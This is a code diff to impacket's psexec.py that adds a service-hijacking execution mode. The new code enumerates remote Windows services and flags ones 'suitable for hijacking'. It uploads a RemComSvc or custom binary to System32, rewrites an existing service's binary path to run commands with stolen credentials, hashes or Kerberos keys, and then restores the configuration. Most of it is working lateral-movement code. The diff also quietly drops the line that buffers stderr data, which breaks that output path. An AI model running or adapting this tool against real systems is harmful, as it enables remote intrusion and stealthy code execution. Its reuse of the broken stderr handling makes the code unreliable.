@@ -32,11 +32,11 @@ import time
 from six import PY3
 
 from impacket.examples import logger
-from impacket import version, smb
+from impacket import version, smb, LOG
 from impacket.smbconnection import SMBConnection
-from impacket.dcerpc.v5 import transport
+from impacket.dcerpc.v5 import transport, scmr
 from impacket.structure import Structure
-from impacket.examples import remcomsvc, serviceinstall
+from impacket.examples import remcomsvc, serviceinstall, servicechange
 from impacket.examples.utils import parse_target
 from impacket.krb5.keytab import Keytab
 
@@ -63,11 +63,10 @@ RemComSTDIN = "RemCom_stdin"
 RemComSTDERR = "RemCom_stderr"
 
 lock = Lock()
-
 class PSEXEC:
     def __init__(self, command, path, exeFile, copyFile, port=445,
                  username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None, serviceName=None,
-                 remoteBinaryName=None):
+                 remoteBinaryName=None, service_list=False, list_all=False, service_change=None):
         self.__username = username
         self.__password = password
         self.__port = port
@@ -83,12 +82,27 @@ class PSEXEC:
         self.__kdcHost = kdcHost
         self.__serviceName = serviceName
         self.__remoteBinaryName = remoteBinaryName
+        self.__service_list = service_list
+        self.__list_all = list_all
+        self.__service_change = service_change
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
 
+
     def run(self, remoteName, remoteHost):
+        # Handle service list functionality
+        if self.__service_list:
+            self.listServices(remoteName, remoteHost, self.__list_all)
+
+        # Handle service hijacking functionality
+        if self.__service_change is not None:
+            return self.executeViaServiceHijacking(remoteName, remoteHost)
+        
+
+        # Original psexec functionality
         stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
         logging.debug('StringBinding %s'%stringbinding)
+
         rpctransport = transport.DCERPCTransportFactory(stringbinding)
         rpctransport.set_dport(self.__port)
         rpctransport.setRemoteHost(remoteHost)
@@ -96,6 +110,7 @@ class PSEXEC:
             # This method exists only for selected protocol sequences.
             rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                          self.__nthash, self.__aesKey)
+
         rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
         self.doStuff(rpctransport)
 
@@ -113,10 +128,330 @@ class PSEXEC:
 
         if tries == 0:
             raise Exception('Pipe not ready, aborting')
-
         fid = s.openFile(tid,pipe,accessMask, creationOption = 0x40, fileAttributes = 0x80)
 
         return fid
+
+    def listServices(self, remoteName, remoteHost, list_all):
+        """List all services and mark suitable ones for hijacking"""
+        # Service listing functionality for hijacking analysis
+        LOG.info("Listing services on %s" % remoteHost)
+        
+        try:
+            # Create SMB connection
+            stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
+            rpctransport = transport.DCERPCTransportFactory(stringbinding)
+            rpctransport.set_dport(self.__port)
+            rpctransport.setRemoteHost(remoteHost)
+            
+            if hasattr(rpctransport, 'set_credentials'):
+                rpctransport.set_credentials(self.__username, self.__password, self.__domain, 
+                                           self.__lmhash, self.__nthash, self.__aesKey)
+            
+            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
+            
+            # Create SMB connection for service changer
+            dce = rpctransport.get_dce_rpc()
+            dce.connect()
+            smb_connection = rpctransport.get_smb_connection()
+            
+            # Create service changer
+            service_changer = servicechange.ServiceChanger(smb_connection, remoteHost)
+            
+            # Get all services
+            services = service_changer.listServices(list_all)
+            
+            # Filter only suitable services
+            suitable_services = [s for s in services if s.is_suitable]
+            
+            if not suitable_services:
+                print("\n" + "="*120)
+                print("NO SUITABLE SERVICES FOUND FOR HIJACKING")
+                print("="*120)
+                return True
+            
+            # Print header
+            print("\n" + "="*120)
+            print("SUITABLE SERVICES FOR HIJACKING - %s" % remoteHost)
+            print("="*120)
+            print("%-30s %-15s %-15s %-15s %-20s" % 
+                  ("SERVICE NAME", "START TYPE", "STATUS", "ACCOUNT", "PRIORITY"))
+            print("-"*120)
+            
+            # Sort services by priority (lower number = higher priority)
+            suitable_services.sort(key=lambda x: x.priority)
+            
+            # Print only suitable services
+            fstart_type_map = {
+                0: "BOOT",        # SERVICE_BOOT_START
+                1: "SYSTEM",      # SERVICE_SYSTEM_START
+                2: "AUTO",        # SERVICE_AUTO_START
+                3: "MANUAL",      # SERVICE_DEMAND_START
+                4: "DISABLED"     # SERVICE_DISABLED
+            }
+
+            # Affichage des services adaptés
+            for service in suitable_services:
+                start_type_str = fstart_type_map.get(service.start_type, "UNKNOWN")
+                account = service.start_name[:20] if getattr(service, "start_name", None) else "N/A"
+
+                print(f"{service.service_name[:30]:<30} "
+                      f"{start_type_str:<15} "
+                      f"{'STOPPED':<15} "
+                      f"{account:<20} "
+                      f"{str(service.priority):<10}")
+            
+            print("="*120)
+            print("Total suitable services: %d" % len(suitable_services))
+            print("="*120)
+            
+            return True
+            
+        except Exception as e:
+            LOG.critical("Error listing services: %s" % str(e))
+            return False
+
+    def executeViaServiceHijacking(self, remoteName, remoteHost):
+        """Execute command via service hijacking"""
+        # Main service hijacking execution method
+        LOG.info("Executing command via service hijacking: %s" % self.__command)
+        
+        try:
+            # Create SMB connection
+            stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
+            rpctransport = transport.DCERPCTransportFactory(stringbinding)
+            rpctransport.set_dport(self.__port)
+            rpctransport.setRemoteHost(remoteHost)
+            
+            if hasattr(rpctransport, 'set_credentials'):
+                rpctransport.set_credentials(self.__username, self.__password, self.__domain, 
+                                           self.__lmhash, self.__nthash, self.__aesKey)
+            
+            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
+            
+            # Create SMB connection for service changer
+            dce = rpctransport.get_dce_rpc()
+            dce.connect()
+            smb_connection = rpctransport.get_smb_connection()
+            
+            # Create service changer
+            service_changer = servicechange.ServiceChanger(smb_connection, remoteHost)
+            
+            # Find suitable service or use specified one
+            if self.__service_change:
+                # Use specified service
+                LOG.info("Using specified service: %s" % self.__service_change)
+                service_name = self.__service_change
+                
+                # Verify service exists and is suitable
+                scm_handle = service_changer.openSvcManager()
+                service_info = service_changer.getServiceInfo(service_name, scm_handle)
+                scmr.hRCloseServiceHandle(service_changer.rpcsvc, scm_handle)
+                
+                if not service_info.service_name:
+                    LOG.critical("Service %s not found" % service_name)
+                    return False
+                
+                if not service_changer.isServiceSuitable(service_info):
+                    LOG.critical("Service %s is not suitable: %s" % (service_name, service_info.reason))
+                    return False
+            else:
+                # Find a suitable service automatically
+                LOG.info("Looking for suitable service...")
+                service_info = service_changer.findSuitableService()
+                if not service_info:
+                    LOG.critical("No suitable service found for hijacking")
+                    return False
+                service_name = service_info.service_name
+            
+            LOG.debug("Selected service for hijacking: %s" % service_name)
+            
+            # Step 1: Prepare service hijacking (restore original config first, then backup)
+            LOG.debug("Preparing service hijacking...")
+            # Restore service to original state if previously hijacked
+            
+            '''
+            Not valid check, not use static uploaded filename
+            # First, try to restore service to original state if it was previously hijacked
+            LOG.debug("Checking if service needs restoration to original state...")
+            try:
+                # Get current service info to check if it's been hijacked
+                scm_handle = service_changer.openSvcManager()
+                current_info = service_changer.getServiceInfo(service_name, scm_handle)
+                scmr.hRCloseServiceHandle(service_changer.rpcsvc, scm_handle)
+                if current_info.binary_path_name and ('RemCom' in current_info.binary_path_name):
+                    LOG.info("Service appears to be hijacked, attempting to restore original configuration...")
+                    # Try to restore using a default configuration
+                    from impacket.examples.servicechange import ServiceInfo
+                    default_config = ServiceInfo()
+                    default_config.binary_path_name = "C:\\Windows\\System32\\OpenSSH\\ssh-agent.exe" if service_name == "ssh-agent" else "C:\\Windows\\System32\\alg.exe" if service_name == "ALG" else "C:\\Windows\\system32\\ntfrs.exe" if service_name == "NtFrs" else "C:\\Windows\\system32\\vssvc.exe" if service_name == "VSS" else "C:\\Windows\\system32\\SearchIndexer.exe" if service_name == "WSearch" else "C:\\Windows\\System32\\snmptrap.exe" if service_name == "SNMPTRAP" else "C:\\Windows\\system32\\locator.exe" if service_name == "RpcLocator" else ""
+                    default_config.start_type = 3  # MANUAL
+                    default_config.start_name = "NT AUTHORITY\\LocalService" if service_name in ["ALG", "SNMPTRAP"] else "LocalSystem"
+                    service_changer.restoreServiceConfig(service_name, default_config)
+                    LOG.debug("Service restored to default configuration")
+            except Exception as e:
+                LOG.debug("Could not restore service to original state: %s" % str(e))
+            '''
+
+            # Now backup the (hopefully) original configuration
+            original_config = service_changer.backupServiceConfig(service_name)
+            
+            # Upload RemComSvc file (use custom file if specified)
+            from impacket.examples import serviceinstall
+            
+            # Determine which executable to use
+            if self.__exeFile is not None:
+                # Use custom file specified with -file parameter
+                LOG.info("Using custom executable: %s" % self.__exeFile)
+                try:
+                    exe_file = open(self.__exeFile, 'rb')
+                except Exception as e:
+                    LOG.critical("Error opening custom executable %s: %s" % (self.__exeFile, str(e)))
+                    return False
+                installService = serviceinstall.ServiceInstall(service_changer.connection, exe_file, service_name, self.__remoteBinaryName)
+                remcom_filename = installService.binaryServiceName
+                service_changer.uploadFile(exe_file, "System32\\" + remcom_filename)
+            else:
+                # Use default RemComSvc
+                LOG.info("Using default RemComSvc executable")
+                installService = serviceinstall.ServiceInstall(service_changer.connection, remcomsvc.RemComSvc(), service_name, self.__remoteBinaryName)
+                remcom_svc = remcomsvc.RemComSvc()
+                remcom_filename = installService.binaryServiceName
+                service_changer.uploadFile(remcom_svc, "System32\\" + remcom_filename)
+            
+            # Handle -c parameter (copy file and modify command)
+            if self.__copyFile is not None:
+                LOG.info("Copying file for execution: %s" % self.__copyFile)
+                try:
+                    # Copy the file to target
+                    service_changer.uploadFile(open(self.__copyFile, 'rb'), "System32\\" + os.path.basename(self.__copyFile))
+                    # Modify command to use the copied file
+                    self.__command = os.path.basename(self.__copyFile) + ' ' + self.__command
+                    LOG.info("Modified command to: %s" % self.__command)
+                except Exception as e:
+                    LOG.critical("Error copying file %s: %s" % (self.__copyFile, str(e)))
+                    return False
+            
+            # Hijack service with RemComSvc
+            full_remcom_path = "C:\\Windows\\System32\\" + remcom_filename
+            if not service_changer.hijackService(service_name, full_remcom_path):
+                LOG.critical("Failed to hijack service")
+                return False
+            
+            LOG.info("Service hijacked successfully, now starting service to executing command...")
+            # Step 2: Execute command through hijacked service
+            # The service is already hijacked with RemComSvc, now we need to communicate with it
+            LOG.debug("Executing command through hijacked service...")
+            # Execute command through the hijacked service
+            
+            # Create SMB connection for communication
+            stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
+            rpctransport = transport.DCERPCTransportFactory(stringbinding)
+            rpctransport.set_dport(self.__port)
+            rpctransport.setRemoteHost(remoteHost)
+            if hasattr(rpctransport, 'set_credentials'):
+                rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
+                                           self.__nthash, self.__aesKey)
+            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
+            
+            # Execute command through the hijacked service using doStuff logic
+            # but skip the service installation part since we already hijacked a service
+            self.executeCommandViaHijackedService(rpctransport, service_changer, service_name, original_config, full_remcom_path)
+            
+            # Step 3: Restore original service configuration
+            service_changer.restoreServiceConfig(service_name, original_config)
+            
+            # Cleanup uploaded files
+            service_changer.cleanupFiles()
+            
+            # Cleanup -c parameter file if used
+            if self.__copyFile is not None:
+                try:
+                    LOG.info("Cleaning up copied file: %s" % os.path.basename(self.__copyFile))
+                    service_changer.connection.deleteFile("ADMIN$", "System32\\" + os.path.basename(self.__copyFile))
+                except Exception as e:
+                    LOG.warning("Failed to cleanup copied file: %s" % str(e))
+            
+            return True
+            
+        except  (Exception, KeyboardInterrupt) as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+            logging.error(str(e))
+            if smb_connection is not None:
+                smb_connection.logoff()
+            sys.stdout.flush()
+            sys.exit(0)
+
+        if smb_connection is not None:
+            smb_connection.logoff()
+        sys.stdout.flush()
+        sys.exit(0)
+
+    def executeCommandViaHijackedService(self, rpctransport, service_changer, service_name, original_config, uploadedFile):
+        """Execute command through already hijacked service"""
+        # Command execution through hijacked service
+        dce = rpctransport.get_dce_rpc()
+        try:
+            dce.connect()
+        except Exception as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+            logging.critical(str(e))
+            sys.exit(1)
+
+        global dialect
+        dialect = rpctransport.get_smb_connection().getDialect()
+        
+        try:
+            s = rpctransport.get_smb_connection()
+            s.setTimeout(100000)
+            
+            # Connect to IPC$ and open communication pipe
+            tid = s.connectTree('IPC$')
+            fid_main = self.openPipe(s, tid, r'\RemCom_communicaton', 0x12019f)
+            
+            # Create command message
+            packet = RemComMessage()
+            pid = os.getpid()
+            packet['Machine'] = ''.join([random.choice(string.ascii_letters) for _ in range(4)])
+            if self.__path is not None:
+                packet['WorkingDir'] = self.__path
+            packet['Command'] = self.__command
+            packet['ProcessID'] = pid
+
+            # Send command to hijacked service
+            s.writeNamedPipe(tid, fid_main, packet.getData())
+
+            global LastDataSent
+            LastDataSent = ''
+
+            # Start communication pipes
+            stdin_pipe = RemoteStdInPipe(rpctransport,
+                                       r'\%s%s%d' % (RemComSTDIN, packet['Machine'], packet['ProcessID']),
+                                       smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, None)
+            stdin_pipe.start()
+            stdout_pipe = RemoteStdOutPipe(rpctransport,
+                                         r'\%s%s%d' % (RemComSTDOUT, packet['Machine'], packet['ProcessID']),
+                                         smb.FILE_READ_DATA)
+            stdout_pipe.start()
+            stderr_pipe = RemoteStdErrPipe(rpctransport,
+                                         r'\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']),
+                                         smb.FILE_READ_DATA)
+            stderr_pipe.start()
+
+            # Wait for response
+            ans = s.readNamedPipe(tid, fid_main, 8)
+            if len(ans):
+                retCode = RemComResponse(ans)
+                logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
+
+                #sys.exit(retCode['ErrorCode'])
+
+        except  (Exception, KeyboardInterrupt, SystemExit) as e:
+            return
 
     def doStuff(self, rpctransport):
 
@@ -136,8 +471,6 @@ class PSEXEC:
         try:
             unInstalled = False
             s = rpctransport.get_smb_connection()
-
-            # We don't wanna deal with timeouts from now on.
             s.setTimeout(100000)
             if self.__exeFile is None:
                 installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), remcomsvc.RemComSvc(), self.__serviceName, self.__remoteBinaryName)
@@ -148,22 +481,17 @@ class PSEXEC:
                     logging.critical(str(e))
                     sys.exit(1)
                 installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), f, self.__serviceName, self.__remoteBinaryName)
-
             if installService.install() is False:
                 return
 
             if self.__exeFile is not None:
                 f.close()
 
-            # Check if we need to copy a file for execution
             if self.__copyFile is not None:
                 installService.copy_file(self.__copyFile, installService.getShare(), os.path.basename(self.__copyFile))
-                # And we change the command to be executed to this filename
                 self.__command = os.path.basename(self.__copyFile) + ' ' + self.__command
-
             tid = s.connectTree('IPC$')
             fid_main = self.openPipe(s,tid,r'\RemCom_communicaton',0x12019f)
-
             packet = RemComMessage()
             pid = os.getpid()
 
@@ -175,12 +503,10 @@ class PSEXEC:
 
             s.writeNamedPipe(tid, fid_main, packet.getData())
 
-            # Here we'll store the command we type so we don't print it back ;)
-            # ( I know.. globals are nasty :P )
+
             global LastDataSent
             LastDataSent = ''
 
-            # Create the pipes threads
             stdin_pipe = RemoteStdInPipe(rpctransport,
                                          r'\%s%s%d' % (RemComSTDIN, packet['Machine'], packet['ProcessID']),
                                          smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, installService.getShare())
@@ -193,14 +519,13 @@ class PSEXEC:
                                            r'\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']),
                                            smb.FILE_READ_DATA)
             stderr_pipe.start()
-
-            # And we stay here till the end
             ans = s.readNamedPipe(tid,fid_main,8)
 
             if len(ans):
                 retCode = RemComResponse(ans)
                 logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (
                 self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
+
             installService.uninstall()
             if self.__copyFile is not None:
                 # We copied a file for execution, let's remove it
@@ -244,6 +569,7 @@ class Pipes(Thread):
             #self.server = SMBConnection('*SMBSERVER', self.transport.get_smb_connection().getRemoteHost(), sess_port = self.port, preferredDialect = SMB_DIALECT)
             self.server = SMBConnection(self.transport.get_smb_connection().getRemoteName(), self.transport.get_smb_connection().getRemoteHost(),
                                         sess_port=self.port, preferredDialect=dialect)
+
             user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
             if self.transport.get_kerberos() is True:
                 self.server.kerberosLogin(user, passwd, domain, lm, nt, aesKey, kdcHost=self.transport.get_kdcHost(), TGT=TGT, TGS=TGS)
@@ -261,7 +587,6 @@ class Pipes(Thread):
                 traceback.print_exc()
             logging.error("Something wen't wrong connecting the pipes(%s), try again" % self.__class__)
 
-
 class RemoteStdOutPipe(Pipes):
     def __init__(self, transport, pipe, permisssions):
         Pipes.__init__(self, transport, pipe, permisssions)
@@ -270,7 +595,6 @@ class RemoteStdOutPipe(Pipes):
         self.connectPipe()
 
         global LastDataSent
-
         if PY3:
             __stdoutOutputBuffer, __stdoutData = b"", b""
 
@@ -306,9 +630,6 @@ class RemoteStdOutPipe(Pipes):
                             __stdoutData = b"\n".join(lines[:-1]) + b"\n"
                             # Remainder data for next iteration
                             __stdoutOutputBuffer = lines[-1]
-                            # print("[+] newline in __stdoutOutputBuffer")
-                            # print(" | __stdoutData:",__stdoutData)
-                            # print(" | __stdoutOutputBuffer:",__stdoutOutputBuffer)
 
                         if len(__stdoutData) != 0:
                             # There is data to print
@@ -387,6 +708,7 @@ class RemoteStdErrPipe(Pipes):
     def run(self):
         self.connectPipe()
 
+
         if PY3:
             __stderrOutputBuffer, __stderrData = b'', b''
 
@@ -398,16 +720,12 @@ class RemoteStdErrPipe(Pipes):
                 else:
                     try:
                         if len(stderr_ans) != 0:
-                            # Append new data to the buffer while there is data to read
-                            __stderrOutputBuffer += stderr_ans
-
-                        if b'\n' in __stderrOutputBuffer:
-                            # We have read a line, print buffer if it is not empty
-                            lines = __stderrOutputBuffer.split(b"\n")
-                            # All lines, we shouldn't have encoding errors
-                            __stderrData = b"\n".join(lines[:-1]) + b"\n"
-                            # Remainder data for next iteration
-                            __stderrOutputBuffer = lines[-1]
+                            if b'\n' in __stderrOutputBuffer:
+                                # We have read a line, print buffer if it is not empty
+                                lines = __stderrOutputBuffer.split(b"\n")
+                                # All lines, we shouldn't have encoding errors
+                                __stderrData = b"\n".join(lines[:-1]) + b"\n"
+                                __stderrOutputBuffer = lines[-1]
 
                         if len(__stderrData) != 0:
                             # There is data to print
@@ -466,7 +784,6 @@ class RemoteStdErrPipe(Pipes):
                         #     LastDataSent = ''
                     except:
                         pass
-
 
 class RemoteShell(cmd.Cmd):
     def __init__(self, server, port, credentials, tid, fid, share, transport):
@@ -538,6 +855,7 @@ class RemoteShell(cmd.Cmd):
 
             src_file = os.path.basename(src_path)
             fh = open(src_path, 'rb')
+
             f = dst_path + '/' + src_file
             pathname = f.replace('/','\\')
             logging.info("Uploading %s to %s\\%s" % (src_file, self.share, dst_path))
@@ -568,7 +886,6 @@ class RemoteShell(cmd.Cmd):
             self.send_data(line.encode(CODEC)+b'\r\n')
         else:
             self.send_data(line.decode(sys.stdin.encoding).encode(CODEC)+'\r\n')
-
     def send_data(self, data, hideOutput = True):
         if hideOutput is True:
             global LastDataSent
@@ -633,6 +950,13 @@ if __name__ == '__main__':
                                                                                 ' used to trigger the payload')
     group.add_argument('-remote-binary-name', action='store', metavar="remote_binary_name", default = None, help='This will '
                                                             'be the name of the executable uploaded on the target')
+    
+    group = parser.add_argument_group('service hijacking')
+    # Service hijacking functionality arguments
+    
+    group.add_argument('-service-list', action='store_true', help='List most common services on target and mark suitable ones for hijacking')
+    group.add_argument('--list-all', default=False, action='store_true', help='Flag to list all services instead of most common ones')
+    group.add_argument('-service-change', action='store', metavar="service_name", help='Execute command by hijacking specified service')
 
     if len(sys.argv)==1:
         parser.print_help()
@@ -641,7 +965,17 @@ if __name__ == '__main__':
     options = parser.parse_args()
 
     # Init the example's logger theme
-    logger.init(options.ts, options.debug)
+    # Handle different versions of impacket logger.init()
+    try:
+        # Try the newer API with both ts and debug parameters
+        logger.init(options.ts, options.debug)
+    except TypeError:
+        try:
+            # Fallback for versions that only accept debug parameter
+            logger.init(options.debug)
+        except TypeError:
+            # Fallback for versions that don't accept any parameters
+            logger.init()
 
     if options.codec is not None:
         CODEC = options.codec
@@ -673,5 +1007,6 @@ if __name__ == '__main__':
         command = 'cmd.exe'
 
     executer = PSEXEC(command, options.path, options.file, options.c, int(options.port), username, password, domain, options.hashes,
-                      options.aesKey, options.k, options.dc_ip, options.service_name, options.remote_binary_name)
+                      options.aesKey, options.k, options.dc_ip, options.service_name, options.remote_binary_name, 
+                      options.service_list, options.list_all, options.service_change)
     executer.run(remoteName, options.target_ip)
